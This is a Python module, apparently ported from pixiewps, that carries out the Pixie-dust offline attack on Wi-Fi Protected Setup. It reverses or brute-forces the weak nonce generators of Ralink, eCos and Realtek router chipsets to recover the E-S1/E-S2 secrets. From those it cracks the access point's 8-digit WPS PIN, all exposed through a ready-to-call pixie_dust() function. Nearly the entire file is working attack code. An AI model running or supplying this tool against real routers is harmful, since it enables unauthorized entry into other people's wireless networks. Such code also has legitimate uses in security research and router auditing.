"""Pixie-dust offline WPS attack.

Given M1+M3 crypto material (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2)
recovered from a single live M1→M3 exchange, tries to recover E-S1/E-S2 by
exploiting weak/predictable nonce generators in known AP chipset families,
then cracks the WPS PIN offline without any further radio contact.

Mode priority (higher confidence first):
  RT   — Ralink LFSR (LFSR seed → E-Nonce, so E-S1/E-S2 precede it in stream)
  ECOS — glibc LCG used in eCos (25-bit search space)
  RTL  — Realtek RTL819x (Park-Miller, time-seeded; search ±MODE3_TRIES seconds)

ECOS_SIMPLEST and ECOS_KNUTH (pixiewps modes 4/5) are included but those are
marked "Not tested" by the reference authors — kept for completeness.
"""

from __future__ import annotations

import hashlib
import hmac
import time
from dataclasses import dataclass

# ── constants (from pixiewps/wps.h) ──────────────────────────────────────────
_NONCE_LEN = 16        # E-Nonce / E-S1 / E-S2 byte length
_HASH_LEN  = 32        # HMAC-SHA-256 digest length
_PSK_LEN   = 16        # psk_half() output trimmed to 16 bytes

# Realtek time-seed search window (seconds forward and backward from timestamp)
_MODE3_TRIES = 10_000


# ── PRNG implementations (verbatim from pixiewps) ────────────────────────────

def _lfsr_byte(sreg: int) -> tuple[int, int]:
    """Advance Ralink LFSR by 8 steps; return (byte, new_sreg). sreg is uint32."""
    r = 0
    for _ in range(8):
        if sreg & 1:
            sreg = ((sreg ^ 0x80000057) >> 1) | 0x80000000
            bit = 1
        else:
            sreg >>= 1
            bit = 0
        r = (r << 1) | bit
    return r & 0xFF, sreg & 0xFFFFFFFF


def _lfsr_byte_backwards(sreg: int) -> tuple[int, int]:
    """Run Ralink LFSR backwards 8 steps; return (byte, new_sreg)."""
    r = 0
    for i in range(8):
        if sreg & 0x80000000:
            sreg = ((sreg << 1) ^ 0x80000057) | 0x00000001
            bit = 1
        else:
            sreg <<= 1
            bit = 0
        sreg &= 0xFFFFFFFF
        r |= (bit << i)
    return r & 0xFF, sreg


def _lfsr_restore(sreg: int, byte_val: int) -> int:
    """Reverse-restore Ralink LFSR: given the current state, un-apply one byte."""
    for _ in range(8):
        bit = byte_val & 1
        byte_val >>= 1
        if bit:
            sreg = (((sreg) << 1) ^ 0x80000057) | 0x00000001
        else:
            sreg = sreg << 1
        sreg &= 0xFFFFFFFF
    return sreg


def _ecos_simple(seed: int) -> tuple[int, int]:
    """glibc LCG: return (byte, new_seed). seed is uint32."""
    MASK = 0xFFFFFFFF
    s = (seed * 1103515245 + 12345) & MASK
    uret = s & 0xFFE00000
    s = (s * 1103515245 + 12345) & MASK
    uret += (s & 0xFFFC0000) >> 11
    s = (s * 1103515245 + 12345) & MASK
    uret += (s & 0xFE000000) >> 25
    return (uret & 0xFF), s


def _ecos_simplest(seed: int) -> tuple[int, int]:
    seed = (seed * 1103515245 + 12345) & 0xFFFFFFFF
    return seed & 0xFF, seed


def _ecos_knuth(seed: int) -> tuple[int, int]:
    MM = 0x7FFFFFFF
    AA = 48271
    QQ = 44488
    RR = 3399
    seed = AA * (seed % QQ) - RR * (seed // QQ)
    if seed & 0x80000000:
        seed += MM
    seed &= 0xFFFFFFFF
    return seed & 0xFF, seed


_PARK_MILLER_A = 16807
_PARK_MILLER_M = 0x7FFFFFFF


def _park_miller_step(seed: int) -> int:
    """Park-Miller / MINSTD generator step (used in rtl_nonce_fill)."""
    p = _PARK_MILLER_A * seed
    seed = (p >> 31) + (p & _PARK_MILLER_M)
    if seed >= _PARK_MILLER_M:
        seed -= _PARK_MILLER_M
    return seed & 0xFFFFFFFF


# glibc_seed_tbl used in rtl_nonce_fill: 34 words, indices j+0..j+3 for j in 0..30
# These are Park-Miller outputs starting from seed=1 (confirmed from pixiewps source)
def _build_glibc_seed_tbl() -> list[int]:
    s = 1
    tbl = []
    for _ in range(34):
        s = _park_miller_step(s)
        tbl.append(s)
    return tbl

_GLIBC_SEED_TBL = _build_glibc_seed_tbl()


def _rtl_nonce_fill(seed: int) -> bytes:
    """Realtek RTL819x nonce generator (rtl_nonce_fill from pixiewps)."""
    word0 = word1 = word2 = word3 = 0
    s = seed & 0x7FFFFFFF
    for j in range(31):
        word0 = (word0 + s * _GLIBC_SEED_TBL[j + 3]) & 0xFFFFFFFF
        word1 = (word1 + s * _GLIBC_SEED_TBL[j + 2]) & 0xFFFFFFFF
        word2 = (word2 + s * _GLIBC_SEED_TBL[j + 1]) & 0xFFFFFFFF
        word3 = (word3 + s * _GLIBC_SEED_TBL[j + 0]) & 0xFFFFFFFF
        s = _park_miller_step(s)
    import struct
    result = struct.pack(
        ">IIII",
        (word0 >> 1) & 0x7FFFFFFF,
        (word1 >> 1) & 0x7FFFFFFF,
        (word2 >> 1) & 0x7FFFFFFF,
        (word3 >> 1) & 0x7FFFFFFF,
    )
    return result


# ── PIN cracking (offline, using recovered E-S1/E-S2) ─────────────────────────

def _psk_half(auth_key: bytes, half_ascii: bytes) -> bytes:
    return hmac.new(auth_key, half_ascii, hashlib.sha256).digest()[:_PSK_LEN]


def _check_hash(auth_key: bytes, es: bytes, psk: bytes, pke: bytes, pkr: bytes,
                ehash: bytes) -> bool:
    msg = es + psk + pke + pkr
    computed = hmac.new(auth_key, msg, hashlib.sha256).digest()
    return computed == ehash


def _pin_checksum(first7: int) -> int:
    acc = 0
    tmp = first7
    for _ in range(7):
        acc += (tmp % 10) * 3
        tmp //= 10
        acc += (tmp % 10)
        tmp //= 10
    return (10 - (acc % 10)) % 10


def _crack_first_half(auth_key: bytes, es1: bytes, pke: bytes, pkr: bytes,
                      e_hash1: bytes) -> str | None:
    """Brute-force first 4 digits of WPS PIN (0000-9999). Returns '0000'-'9999' or None."""
    empty_psk = hmac.new(auth_key, b"", hashlib.sha256).digest()[:_PSK_LEN]
    if _check_hash(auth_key, es1, empty_psk, pke, pkr, e_hash1):
        return ""  # empty PIN first half
    for n in range(10000):
        half = f"{n:04d}".encode()
        psk = _psk_half(auth_key, half)
        if _check_hash(auth_key, es1, psk, pke, pkr, e_hash1):
            return f"{n:04d}"
    return None


def _crack_second_half(auth_key: bytes, es2: bytes, pke: bytes, pkr: bytes,
                       e_hash2: bytes, first_half: str) -> str | None:
    """Brute-force second 4 digits. first_half may be '' for empty-PIN case."""
    if not first_half:
        empty_psk = hmac.new(auth_key, b"", hashlib.sha256).digest()[:_PSK_LEN]
        if _check_hash(auth_key, es2, empty_psk, pke, pkr, e_hash2):
            return ""
    fh_int = int(first_half) if first_half else 0
    for n in range(1000):
        cs = _pin_checksum(fh_int * 1000 + n)
        second = f"{n * 10 + cs:04d}"
        psk = _psk_half(auth_key, second.encode())
        if _check_hash(auth_key, es2, psk, pke, pkr, e_hash2):
            return second
    return None


def crack_pin_from_secrets(auth_key: bytes, es1: bytes, es2: bytes,
                           pke: bytes, pkr: bytes,
                           e_hash1: bytes, e_hash2: bytes) -> str | None:
    """Given E-S1/E-S2, crack the full WPS PIN offline. Returns 8-digit string or None."""
    first = _crack_first_half(auth_key, es1, pke, pkr, e_hash1)
    if first is None:
        return None
    second = _crack_second_half(auth_key, es2, pke, pkr, e_hash2, first)
    if second is None:
        return None
    return (first + second) if (first or second) else ""


# ── Mode implementations ──────────────────────────────────────────────────────

def _try_rt(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
            e_hash1: bytes, e_hash2: bytes) -> str | None:
    """Ralink LFSR: reverse from E-Nonce to find E-S1/E-S2 preceding it."""
    # Special case: E-S1 = E-S2 = 0x00 * 16
    zero = bytes(16)
    if _check_hash(auth_key, zero, _psk_half(auth_key, b""), pke, pkr, e_hash1):
        pin = crack_pin_from_secrets(auth_key, zero, zero, pke, pkr, e_hash1, e_hash2)
        if pin is not None:
            return pin

    # Reverse the LFSR through E-Nonce bytes to find the pre-nonce state
    sreg = 0
    for i in range(_NONCE_LEN - 1, -1, -1):
        sreg = _lfsr_restore(sreg, e_nonce[i])

    saved_sreg = sreg
    # Verify forward: does running from saved_sreg reproduce e_nonce?
    test_sreg = sreg
    for i in range(_NONCE_LEN):
        b, test_sreg = _lfsr_byte(test_sreg)
        if b != e_nonce[i]:
            return None  # this nonce wasn't generated by the RT LFSR

    # Recover E-S2 and E-S1 (they precede E-Nonce in the LFSR stream)
    sreg = saved_sreg
    es2 = bytearray(_NONCE_LEN)
    for i in range(_NONCE_LEN - 1, -1, -1):
        b, sreg = _lfsr_byte_backwards(sreg)
        es2[i] = b
    es1 = bytearray(_NONCE_LEN)
    for i in range(_NONCE_LEN - 1, -1, -1):
        b, sreg = _lfsr_byte_backwards(sreg)
        es1[i] = b

    return crack_pin_from_secrets(auth_key, bytes(es1), bytes(es2),
                                  pke, pkr, e_hash1, e_hash2)


def _try_ecos(prng_fn, e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
              e_hash1: bytes, e_hash2: bytes, search_bits: int = 32) -> str | None:
    """Generic ECOS search: seed produces E-Nonce then E-S1 then E-S2.

    For ECOS_SIMPLE (search_bits=25):
      The PRNG state *after* the first call (which produced nonce[0]) has its
      top 7 bits equal to nonce[0]'s bottom 7 bits (because ecos_rand_simple
      puts s3's top 7 bits into the return value's bottom 7 bits, and s3 is
      the updated state). So we search states where `state >> 25 = nonce[0] & 0x7F`
      and verify nonce[1..15] from that state — matching pixiewps exactly.

    For ECOS_SIMPLEST / ECOS_KNUTH (search_bits=32): full search, state produces
      all 16 nonce bytes directly (PRNG output = state directly for SIMPLEST).
    """
    MASK = 0xFFFFFFFF
    if search_bits < 32:
        # known: top 7 bits of the post-first-call state come from nonce[0] & 0x7F
        # (ecos_rand_simple only: s3 >> 25 == output & 0x7F)
        known = (e_nonce[0] & 0x7F) << 25  # matches C: e_nonce[0] << 25 (7 sig bits)
        total = 1 << search_bits  # 2^25
        for counter in range(total):
            # seed here is the post-first-call state (S'), not the original seed
            seed = (known | counter) & MASK
            s = seed
            match = True
            for i in range(1, _NONCE_LEN):  # nonce[0] already consumed
                b, s = prng_fn(s)
                if b != e_nonce[i]:
                    match = False
                    break
            if match:
                es1 = bytearray(_NONCE_LEN)
                for i in range(_NONCE_LEN):
                    b, s = prng_fn(s)
                    es1[i] = b
                es2 = bytearray(_NONCE_LEN)
                for i in range(_NONCE_LEN):
                    b, s = prng_fn(s)
                    es2[i] = b
                pin = crack_pin_from_secrets(auth_key, bytes(es1), bytes(es2),
                                             pke, pkr, e_hash1, e_hash2)
                if pin is not None:
                    return pin
    else:
        for seed in range(0x100000000):
            s = seed
            match = True
            for i in range(_NONCE_LEN):
                b, s = prng_fn(s)
                if b != e_nonce[i]:
                    match = False
                    break
            if match:
                es1 = bytearray(_NONCE_LEN)
                for i in range(_NONCE_LEN):
                    b, s = prng_fn(s)
                    es1[i] = b
                es2 = bytearray(_NONCE_LEN)
                for i in range(_NONCE_LEN):
                    b, s = prng_fn(s)
                    es2[i] = b
                pin = crack_pin_from_secrets(auth_key, bytes(es1), bytes(es2),
                                             pke, pkr, e_hash1, e_hash2)
                if pin is not None:
                    return pin
    return None


def _try_rtl(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
             e_hash1: bytes, e_hash2: bytes,
             timestamp: int | None = None) -> str | None:
    """Realtek RTL819x: E-S1 = E-S2 = E-Nonce is the fast path; time-seed is the real path."""
    # Fast path: E-S1 = E-S2 = E-Nonce (seen in auto mode)
    pin = crack_pin_from_secrets(auth_key, e_nonce, e_nonce,
                                 pke, pkr, e_hash1, e_hash2)
    if pin is not None:
        return pin

    # Time-seeded path: nonce_seed ≈ capture timestamp ± MODE3_TRIES
    if timestamp is None:
        timestamp = int(time.time())

    def try_seed(seed: int) -> str | None:
        nonce_candidate = _rtl_nonce_fill(seed)
        # E-Nonce must have MSB clear in bytes 0,4,8,12 (RTL filter from pixiewps)
        if (e_nonce[0] & 0x80) or (e_nonce[4] & 0x80) or \
           (e_nonce[8] & 0x80) or (e_nonce[12] & 0x80):
            return None
        if nonce_candidate != e_nonce:
            return None
        # E-S1 and E-S2 come from seed and seed+j (j in 0..9)
        es1 = _rtl_nonce_fill(seed)
        for j in range(10):
            es2 = _rtl_nonce_fill(seed + j)
            p = crack_pin_from_secrets(auth_key, es1, es2,
                                       pke, pkr, e_hash1, e_hash2)
            if p is not None:
                return p
        return None

    for dist in range(_MODE3_TRIES + 1):
        r = try_seed(timestamp + dist)
        if r is not None:
            return r
        if dist:
            r = try_seed(timestamp - dist)
            if r is not None:
                return r
    return None


# ── Public API ────────────────────────────────────────────────────────────────

@dataclass
class PixieResult:
    pin: str | None
    mode: str | None    # "RT", "ECOS_SIMPLE", "RTL819x", "ECOS_SIMPLEST", "ECOS_KNUTH"


def pixie_dust(
    e_nonce: bytes,
    auth_key: bytes,
    pke: bytes,
    pkr: bytes,
    e_hash1: bytes,
    e_hash2: bytes,
    timestamp: int | None = None,
) -> PixieResult:
    """Run all pixie-dust modes in priority order.

    Args:
        e_nonce   : 16-byte enrollee nonce from M1
        auth_key  : 32-byte AuthKey derived from M1+M2 DH exchange
        pke       : 192-byte enrollee public DH key (from M1)
        pkr       : 192-byte registrar public DH key (from M2)
        e_hash1   : 32-byte E-Hash1 (from M3)
        e_hash2   : 32-byte E-Hash2 (from M3)
        timestamp : Unix timestamp when M1 was captured (for RTL819x; uses now() if None)

    Returns:
        PixieResult with .pin (8-char string or None) and .mode that found it.
    """
    # RT (Ralink LFSR) — most common, fast O(1) reverse
    pin = _try_rt(e_nonce, auth_key, pke, pkr, e_hash1, e_hash2)
    if pin is not None:
        return PixieResult(pin=pin, mode="RT")

    # ECOS_SIMPLE — 25-bit search
    pin = _try_ecos(_ecos_simple, e_nonce, auth_key, pke, pkr,
                    e_hash1, e_hash2, search_bits=25)
    if pin is not None:
        return PixieResult(pin=pin, mode="ECOS_SIMPLE")

    # RTL819x — fast path + time-seed search
    pin = _try_rtl(e_nonce, auth_key, pke, pkr, e_hash1, e_hash2, timestamp)
    if pin is not None:
        return PixieResult(pin=pin, mode="RTL819x")

    # ECOS_SIMPLEST — full 32-bit, slow; marked "Not tested" by authors
    pin = _try_ecos(_ecos_simplest, e_nonce, auth_key, pke, pkr,
                    e_hash1, e_hash2, search_bits=32)
    if pin is not None:
        return PixieResult(pin=pin, mode="ECOS_SIMPLEST")

    # ECOS_KNUTH — full 32-bit, slow; marked "Not tested" by authors
    pin = _try_ecos(_ecos_knuth, e_nonce, auth_key, pke, pkr,
                    e_hash1, e_hash2, search_bits=32)
    if pin is not None:
        return PixieResult(pin=pin, mode="ECOS_KNUTH")

    return PixieResult(pin=None, mode=None)
